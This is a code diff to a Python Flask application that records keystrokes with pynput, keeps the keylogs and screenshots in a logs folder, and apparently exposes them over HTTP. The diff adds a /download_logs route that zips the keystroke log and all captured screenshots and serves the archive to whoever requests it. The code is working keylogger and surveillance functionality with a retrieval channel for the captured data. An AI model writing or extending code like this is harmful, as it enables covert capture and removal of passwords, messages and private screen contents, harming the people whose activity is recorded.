@@ -8,11 +8,13 @@ import pynput
 import jwt
 import json
 import mimetypes
+import shutil
+import zipfile
 from pynput.keyboard import Listener
 from dotenv import load_dotenv
 from flask_cors import CORS
 from email.message import EmailMessage
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, send_from_directory,  send_file
 
 
 CLERK_JWT_PUBLIC_KEY = os.getenv("CLERK_JWT_PUBLIC_KEY")
@@ -55,6 +57,7 @@ keylog_listener = None
 LOG_FOLDER = "./logs"
 LOG_FILE = os.path.join(LOG_FOLDER, "keylogs.txt")
 SCREENSHOT_FOLDER = os.path.join(LOG_FOLDER, "screenshots")
+ZIP_FILE = "keylogger_logs.zip"
 
 
 def load_config():
@@ -289,6 +292,32 @@ def stop_monitoring():
     monitoring = False
     return jsonify({'message': 'Monitoring stopped'}), 200
 
+
+@app.route("/download_logs", methods=["GET"])
+def download_logs():
+    """Zips all logs and screenshots, then sends the ZIP file."""
+    try:
+        # Remove old ZIP if exists
+        if os.path.exists(ZIP_FILE):
+            os.remove(ZIP_FILE)
+
+        # Create a ZIP archive
+        with zipfile.ZipFile(ZIP_FILE, "w") as zipf:
+            # Add keylog file
+            if os.path.exists(LOG_FILE):
+                zipf.write(LOG_FILE, os.path.basename(LOG_FILE))
+
+            # Add screenshots
+            if os.path.exists(SCREENSHOT_FOLDER):
+                for filename in sorted(os.listdir(SCREENSHOT_FOLDER)):
+                    filepath = os.path.join(SCREENSHOT_FOLDER, filename)
+                    if filename.endswith(".png"):
+                        zipf.write(filepath, os.path.join("screenshots", filename))
+
+        return send_file(ZIP_FILE, as_attachment=True)
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 if __name__ == "__main__":
     ensure_directories()
